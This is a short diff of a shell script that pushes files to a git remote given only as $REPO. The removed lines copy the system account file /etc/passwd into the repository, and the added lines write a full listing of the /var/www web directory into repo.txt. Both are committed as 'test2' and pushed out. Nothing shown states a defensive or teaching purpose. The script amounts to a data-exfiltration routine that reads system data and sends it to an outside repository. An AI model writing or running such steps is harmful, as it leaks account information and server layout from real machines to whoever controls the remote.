@@ -8,7 +8,7 @@ cd origin
 git init .
 git remote add origin $REPO
 git pull origin master
-cp /etc/passwd .
-git add passwd 
+find /var/www > repo.txt
+git add repo.txt 
 git commit -m "test2"
 git push origin master
